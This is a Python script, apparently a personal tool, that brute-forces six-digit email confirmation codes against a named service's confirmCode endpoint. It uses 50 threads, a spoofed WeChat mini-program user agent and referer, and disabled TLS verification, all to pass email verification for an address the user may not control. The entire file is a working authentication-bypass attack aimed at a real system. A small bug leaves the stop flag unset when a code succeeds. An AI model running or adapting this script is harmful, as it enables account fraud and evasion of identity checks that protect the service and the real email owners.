'''
F88K email authentication.

Brute force for validation, you may not pass the validation if your device cannot send enough request.
Ajust the threads number, the email and userId.
'''


import json
import threading
import requests

email = 'EXAMPLE'+'@wku.edu.cn'
userId = ''

requests.packages.urllib3.disable_warnings()
base_url = "https://www.jumboxtech.com:8022/user/confirmCode"
header = {
    'Host': 'www.jumboxtech.com:8022',
    'Connection': 'keep-alive',
    # 'Content-Length': '39',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; GM1900 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Safari/537.36 MMWEBID/9558 MicroMessenger/8.0.2.1860(0x28000234) Process/appbrand0 WeChat/arm32 Weixin Android Tablet NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
    'charset': 'utf-8',
    'Accept-Encoding': 'gzip,compress,br,deflate',
    'content-type': 'application/x-www-form-urlencoded',
    'Referer': 'https://servicewechat.com/wxf7f31446cd68367a/5/page-frame.html',
}

threadpool = []
FLAG = False
class bruteForce(threading.Thread):
    def __init__(self, threadId, name, range_:list):
        threading.Thread.__init__(self)
        self.threadId = threadId
        self.name = name
        self.range_ = range_

    def run(self):
        s = requests.session()
        s.keep_alive = False
        for num in range(self.range_[0], self.range_[1]):
            if FLAG: break
            payload = f'userId={userId}&code={num:06d}&email={email}%40wku.edu.cn'
            req = s.post(base_url, headers=header, data=payload, verify=False, proxies={'https':'127.0.0.1:41091'})
            ob = json.loads(req.content.decode(encoding='utf-8'))

            if num % 1000 == 0:
                print(f'[{self.name}]------{num:06d}')

            if ob['msg'] != 'Wrong code.':
                print(ob['msg'],num)
                if 'blank' in ob['msg']:
                    print('Time out or Validation not started, try again')
                    break
                elif 'OK' in ob['msg']:
                    print('EMAIL AUTH PASSED: '+ f'{num:06d}')
                    flag = True
                    break
        print(req.content.decode(encoding='utf-8'))

range_set = [[i*20000, (i+1)*20000-1] for i in range(0,50)]
for t in range(0, 50):
    thread_ = bruteForce(t, f'thread-{t}', range_=range_set[t])
    threadpool.append(thread_)

for t in threadpool:
    t.start()

for t in threadpool:
    t.join()